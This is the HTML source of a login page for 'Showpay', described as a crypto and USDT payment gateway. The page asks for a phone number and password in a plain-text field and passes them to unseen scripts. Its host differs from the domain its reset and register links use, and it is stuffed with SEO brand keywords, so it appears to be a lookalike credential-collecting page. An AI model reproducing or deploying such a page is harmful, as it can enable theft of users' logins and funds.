<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"
    />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
    <!-- Primary Title & Description -->
    <title>Showpay Login - Secure payment gateway</title>
    <meta name="description" content="Complete your Showpay login to access your secure dashboard. The official Showpay app and Showpay Usdt wallet. Fast, safe, and reliable crypto payment gateway.">

    <!-- Targeted Keywords -->
    <meta name="keywords" content="Showpay, Showpay login, Showpay apk, Showpay app, Show pay, Show pay login, Showpay Usdt, Show pay usdt, Showpay official, Showpay secure payment gateway, Showpay help, Showpay customer support, Showpay password reset, Showpay official teligram channel, Show Pay App">

    <!-- Crawling Instructions -->
    <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
    <link rel="canonical" href="https://app-showpay.in/" />

    <!-- Google Site Name & Open Graph (For Social & SERP Name) -->
    <meta property="og:site_name" content="Showpay Login">
    <meta property="og:title" content="Showpay Login - Secure payment gateway">
    <meta property="og:description" content="Access your secure dashboard. Fast, safe, and reliable crypto payment gateway and USDT wallet.">
    <meta property="og:url" content="https://app-showpay.in/">
    <meta property="og:type" content="website">
    <meta property="og:image" content="https://app-showpay.in/assets/showpay-og-image.jpg" />

    <!-- Twitter Tags -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Showpay Login - Secure payment gateway" />
    <meta name="twitter:description" content="Access your secure dashboard. Fast, safe, and reliable crypto payment gateway and USDT wallet." />
    <meta name="twitter:image" content="https://app-showpay.in/assets/showpay-og-image.jpg" />

    <!-- Logo / Favicon -->
    <link rel="icon" type="image/png" href="https://app-showpay.in/assets/logo.png" sizes="32x32">
    <link rel="apple-touch-icon" href="https://app-showpay.in/assets/logo-large.png">

    <!-- Performance Optimizations -->
    <link rel="preload" href="../css/common.css" as="style" />
    <link rel="preload" href="../css/login.css" as="style" />
    <link rel="stylesheet" href="../css/common.css" />
    <link rel="stylesheet" href="../css/login.css" />
    
    <!-- Lucide Icons -->
    <script src="https://unpkg.com/lucide@0.511.0/dist/umd/lucide.min.js"></script>
    
    <!-- Advanced SEO Schema Markup (JSON-LD for Google Auto-Discovery) -->
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@graph": [
        {
          "@type": "WebSite",
          "@id": "https://app-showpay.in/#website",
          "url": "https://app-showpay.in/",
          "name": "Showpay Login",
          "alternateName": ["Showpay", "Show pay", "Showpay App", "Show Pay Login"],
          "description": "Showpay Login - Secure payment gateway"
        },
        {
          "@type": "Organization",
          "@id": "https://app-showpay.in/#organization",
          "name": "Showpay Login",
          "url": "https://app-showpay.in/",
          "logo": {
            "@type": "ImageObject",
            "url": "https://app-showpay.in/assets/logo.png",
            "width": 512,
            "height": 512
          },
          "sameAs": [
            "https://t.me/bolinshowpay1"
          ],
          "contactPoint": {
            "@type": "ContactPoint",
            "contactType": "Customer Support",
            "url": "https://app-showpay.in/"
          }
        }
      ]
    }
    </script>
  </head>
  <body>
    <div class="login-container">
      <div class="header">LOG IN</div>

      <form id="loginForm">
        <div class="form-group">
          <i data-lucide="phone" class="input-icon"></i>
          <input
            type="tel"
            id="mobile"
            class="form-control"
            placeholder="Enter Your Phone Number"
            maxlength="10"
            required
          />
        </div>

        <div class="form-group">
          <i data-lucide="lock" class="input-icon"></i>
          <input
            type="text"
            id="password"
            class="form-control"
            placeholder="Enter Password"
            required
          />
        </div>

        <div class="forgot-password">
          <a href="https://app-web.showpay-web.com/forgetPassword">Forget Password</a>
        </div>

        <div
          id="errorMessage"
          class="hidden"
          style="
            color: red;
            text-align: center;
            margin-bottom: 20px;
            font-size: 14px;
          "
        ></div>

        <div class="login-btn-container">
          <button type="submit" class="btn-primary" id="loginBtn">
            LOG IN
          </button>
        </div>

        <div class="register-link-container">
          <span>Don't have an account?</span> <a href="https://app-web.showpay-web.com/regist?code=2invite5p6">Register</a>
        </div>
      </form>
    </div>

    <!-- Limit Popup -->
    <div
      id="limitPopup"
      style="
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.8);
        z-index: 1000;
        justify-content: center;
        align-items: center;
      "
    ></div>

    <script type="module" src="../js/config/supabase.js"></script>
    <script type="module" src="../js/auth/login.js"></script>
    <script>
      lucide.createIcons();
    </script>
  </body>
</html>
